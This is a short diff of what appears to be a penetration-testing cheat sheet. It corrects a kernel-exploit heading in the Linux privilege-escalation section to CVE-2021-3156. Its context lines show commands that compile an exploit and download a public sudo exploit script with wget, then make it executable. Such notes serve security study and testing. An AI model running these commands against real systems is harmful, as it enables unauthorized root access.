@@ -1378,7 +1378,7 @@ gcc 624.c -m32 -o exploit
 ````
 ## Linux PrivEsc <img src="https://vangogh.teespring.com/v3/image/7xjTL1mj6OG1mj5p4EN_d6B1zVs/800/800.jpg" width="40" height="40" />
 ### Kernel Expoits
-#### CVE-2022-2588
+#### CVE-2021-3156
 ````
 wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
 chmod +x exploit_nss.py
